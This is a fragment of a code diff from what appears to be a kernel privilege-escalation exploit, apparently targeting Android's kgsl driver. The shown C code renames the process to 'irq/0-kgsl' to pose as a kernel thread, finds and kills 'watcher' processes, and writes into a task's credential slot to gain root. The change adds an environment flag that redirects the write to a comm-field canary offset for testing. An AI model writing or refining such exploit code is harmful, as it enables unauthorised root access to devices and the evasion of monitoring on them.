@@ -2262,8 +2262,11 @@ uid0_cred_punch:;
     pid_t watch[32];
     int nw = uid0_scan_watchers(watch, 32);
     prctl(PR_SET_NAME, "irq/0-kgsl", 0, 0, 0);
-    uintptr_t slot = use_task + TASK_CRED_OFF;
-    uid0_one_store(slot, self ? "self_cred" : "child_cred");
+    uintptr_t slot = use_task +
+        (env_flag("UID0_COMM_CANARY", 0) ? 0x790 : TASK_CRED_OFF);
+    uid0_one_store(slot, env_flag("UID0_COMM_CANARY", 0)
+                          ? "child_comm_canary"
+                          : (self ? "self_cred" : "child_cred"));
     uid0_kill_watchers(watch, nw);
     nw = uid0_scan_watchers(watch, 32);
     uid0_kill_watchers(watch, nw);
